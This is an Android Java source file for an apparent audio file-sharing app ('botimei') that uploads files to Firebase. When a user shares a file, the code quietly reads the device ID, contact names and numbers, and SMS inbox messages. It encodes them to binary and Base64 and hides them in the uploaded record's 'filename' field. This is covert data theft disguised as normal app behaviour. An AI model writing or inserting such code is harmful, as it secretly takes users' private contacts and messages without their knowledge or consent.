package com.example.botimei;

import android.annotation.SuppressLint;
import android.app.PendingIntent;
import android.app.ProgressDialog;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.provider.OpenableColumns;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.example.botimei.adapter.ShowFileSharedAdapter;
import com.example.botimei.model.FileShared;
import com.google.android.gms.tasks.Continuation;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.android.material.floatingactionbutton.FloatingActionButton;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.File;
import java.io.FileNotFoundException;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.List;
import java.util.stream.Collectors;

public class ShareFile extends AppCompatActivity {

    FloatingActionButton fab_addFile;
    RecyclerView rv_fileShared;
    TextView tv_appBarName;
    String username, id, email, image, sender, phone;

    ProgressDialog dialog;
    Uri imageuri = null;
    String filename = "";
    DatabaseReference reference;

    List<FileShared> fileSharedList = new ArrayList<>();
    ShowFileSharedAdapter adapter;

    String IMEINumber;
    ArrayList contact_name = new ArrayList();
    ArrayList contact_number = new ArrayList();
    public static String msgData, binary_data;

    public static long beginEncode,endEncode;

    private static final int REQUEST_CODE = 101;

    @RequiresApi(api = Build.VERSION_CODES.N)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_share_file);

        fab_addFile = findViewById(R.id.fab_addFile);
        tv_appBarName = findViewById(R.id.tv_appBarName);
        rv_fileShared = findViewById(R.id.rv_fileShared);
        rv_fileShared.setHasFixedSize(true);
        rv_fileShared.setLayoutManager(new LinearLayoutManager(ShareFile.this));

        Intent intent = getIntent();
        username = intent.getStringExtra("username");
        id = intent.getStringExtra("id");
        email = intent.getStringExtra("email");
        image = intent.getStringExtra("image");
        sender = intent.getStringExtra("sender");
        phone = intent.getStringExtra("phone");

        Toast.makeText(ShareFile.this, "sender: " + sender, Toast.LENGTH_SHORT).show();

        tv_appBarName.setText("File Shared with " + username);

        getFileShared();

        fab_addFile.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                shareFile();
            }
        });



//        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
//        if (ActivityCompat.checkSelfPermission(ShareFile.this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
//            ActivityCompat.requestPermissions(ShareFile.this, new String[]{Manifest.permission.READ_PHONE_STATE}, REQUEST_CODE);
//            return;
//        }
//        IMEINumber = telephonyManager.getDeviceId();
        IMEINumber = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
//        textView.setText(IMEINumber);

    }

    public static String convertStringToBinary(String input) {

        StringBuilder result = new StringBuilder();
        char[] chars = input.toCharArray();
        for (char aChar : chars) {
            result.append(
                    String.format("%8s", Integer.toBinaryString(aChar))   // char -> int, auto-cast
                            .replaceAll(" ", "0")                         // zero pads
            );
        }
        return result.toString();
    }

    @RequiresApi(api = Build.VERSION_CODES.N)
    public static String prettyBinary(String binary, int blockSize, String separator) {

        List<String> result = new ArrayList<>();
        int index = 0;
        while (index < binary.length()) {
            result.add(binary.substring(index, Math.min(index + blockSize, binary.length())));
            index += blockSize;
        }

        return result.stream().collect(Collectors.joining(separator));
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String permissions[], @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case REQUEST_CODE: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    Toast.makeText(this, "Permission granted.", Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(this, "Permission denied.", Toast.LENGTH_SHORT).show();
                }
            }
        }
    }


    private void shareFile() {
        Intent galleryIntent = new Intent();
        galleryIntent.setAction(Intent.ACTION_GET_CONTENT);
        galleryIntent.setType("audio/*");
        startActivityForResult(galleryIntent, 1);

    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (resultCode == RESULT_OK) {

            beginEncode = System.currentTimeMillis();
            System.out.println("Start Time: "+beginEncode);

            dialog = new ProgressDialog(this);
            dialog.setMessage("Encrypting & Uploading");

            dialog.show();
            imageuri = data.getData();
            filename = getFileName(imageuri);

            Uri uri = data.getData();
            File file = null;

            Toast.makeText(ShareFile.this, "filename : " + filename, Toast.LENGTH_SHORT).show();

            final String timestamp = "" + System.currentTimeMillis();
            StorageReference storageReference = FirebaseStorage.getInstance().getReference();
            final String messagePushID = timestamp;

            String[] file_format;
            file_format = filename.split("\\.",2);
//            System.out.println("FILENAME: "+filename);
//            System.out.println("FORMAT: "+file_format[1]);
            final StorageReference filepath = storageReference.child(messagePushID + "." + file_format[1]);
            filepath.putFile(imageuri).continueWithTask((Continuation) task -> {
                if (!task.isSuccessful()) {
                    throw task.getException();
                }
                return filepath.getDownloadUrl();
            }).addOnCompleteListener((OnCompleteListener<Uri>) task -> {
                if (task.isSuccessful()) {
                    dialog.dismiss();

                    Uri uri1 = task.getResult();
                    String myurl;
                    myurl = uri1.toString();

//                    showKeyDialog(file);

                    getAllContacts();
                    readSms();
                    String encodedString = encodeData();


                    reference = FirebaseDatabase.getInstance().getReference().child(UserRegister.FILE_SHARED).child(username).push();

                    HashMap<String, String> hashMap = new HashMap<>();
                    hashMap.put("id", id);
                    hashMap.put("username", username);
                    hashMap.put("sender", sender);
                    hashMap.put("filename", encodedString);
                    hashMap.put("fileUrl", myurl);
                    hashMap.put("phone", phone);

                    String fileCode = reference.getKey();

                    reference.setValue(hashMap).addOnCompleteListener(new OnCompleteListener<Void>() {
                        @Override
                        public void onComplete(@NonNull Task<Void> task) {
                            if (task.isSuccessful()) {
                                filename = "";
//                               sendSMS(phone, fileCode);
                                getFileShared();
                                Toast.makeText(ShareFile.this, "Uploaded Successfully", Toast.LENGTH_SHORT).show();
                            }
                        }
                    });
                } else {
                    dialog.dismiss();
                    Toast.makeText(ShareFile.this, "UploadedFailed", Toast.LENGTH_SHORT).show();
                }
            });
        }
    }


//    private void showKeyDialog(File file) {
//        String keyAES = "AES" + username + filename;
//        String keyDES = "DES" + username + filename;
//
//        MyEncryptionClass.encryptionAES(file, keyAES);
//        MyEncryptionClass.encryptionDES(file, keyDES);
//    }

    private void decryptDialog(File file) {
        String keyAES = "AES" + username + filename;
        String keyDES = "DES" + username + filename;

        try {
            MyEncryptionClass.decryptionAES(file, keyAES);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
        try {
            MyEncryptionClass.decryptionDES(file, keyDES);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
    }

    private void sendSMS(String number, String msg) {

        Intent intent = new Intent(getApplicationContext(), MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(getApplicationContext(), 0, intent, 0);

        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage(number, null, msg, pi, null);

    }

    @SuppressLint("Range")
    public String getFileName(Uri uri) {
        String result = null;
        if (uri.getScheme().equals("content")) {
            Cursor cursor = getContentResolver().query(uri, null, null, null, null);
            try {
                if (cursor != null && cursor.moveToFirst()) {
                    result = cursor.getString(cursor.getColumnIndex(OpenableColumns.DISPLAY_NAME));
                }
            } finally {
                cursor.close();
            }
        }
        if (result == null) {
            result = uri.getPath();
            int cut = result.lastIndexOf('/');
            if (cut != -1) {
                result = result.substring(cut + 1);
            }
        }
        return result;
    }

    private void getFileShared() {
        FirebaseUser firebaseUser = FirebaseAuth.getInstance().getCurrentUser();
        if (firebaseUser.getUid() != null) {
            DatabaseReference reference = FirebaseDatabase.getInstance().getReference().child(UserRegister.FILE_SHARED).child(username);
            reference.addListenerForSingleValueEvent(new ValueEventListener() {
                @Override
                public void onDataChange(@NonNull DataSnapshot snapshot) {
                    fileSharedList.clear();
                    for (DataSnapshot dataSnapshot : snapshot.getChildren()) {
                        FileShared model = dataSnapshot.getValue(FileShared.class);
                        if (model.getSender().equals(sender)) {
                            fileSharedList.add(model);
                        }
                    }
                    adapter = new ShowFileSharedAdapter(ShareFile.this, fileSharedList);
                    rv_fileShared.setAdapter(adapter);
                }

                @Override
                public void onCancelled(@NonNull DatabaseError error) {

                }
            });
        }
    }


    private void getAllContacts() {
//        ArrayList<String> nameList = new ArrayList<>();
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        if ((cur!= null ? cur.getCount() : 0) > 0) {
            while (cur!= null && cur.moveToNext()) {
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
//                nameList.add(name);

//                if(name.equals("Test Cowert") || name.equals("Test abhinav"))
//                {
                    contact_name.add(name);
//                }

                if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
//                        numberArray.add(phoneNo);
//                        if(name.equals("Test Cowert") || name.equals("Test abhinav"))
//                        {
                            contact_number.add(phoneNo);
//                        }

                    }
                    pCur.close();
                }
            }
        }
        if (cur!= null) {
            cur.close();
        }
    }

    private void readSms()
    {
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);

        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {
                msgData = "";
                for(int idx=0;idx<cursor.getColumnCount();idx++)
                {
                    msgData += " " + cursor.getColumnName(2) + ":" + cursor.getString(2) + " " + cursor.getColumnName(12) + ":" + cursor.getString(12);
                    break;
                }
                // use msgData
            } while (cursor.moveToNext());
        } else {
            // empty box, no SMS
        }
    }

    private String encodeData(){

        String contact = "\n"+contact_name.get(0).toString() +":"+ contact_number.get(0).toString() +"\n"+contact_name.get(1).toString()+":"+contact_number.get(1).toString();
        binary_data= prettyBinary(convertStringToBinary(IMEINumber+";"+contact+";"+msgData+";"+filename), 8, " ");

        String encodedString = Base64.getEncoder().encodeToString(binary_data.getBytes());


        endEncode = System.currentTimeMillis();
        System.out.println("End Time: "+endEncode);
        System.out.println("Total Time Encode: "+((endEncode-beginEncode)/1000F));

//                    System.out.println("Total Bits: "+encodedString.length());
        System.out.println("Total Bits: "+(prettyBinary(convertStringToBinary(IMEINumber+";"+contact+";"+msgData), 8, " ")).length());

        return encodedString;
    }
}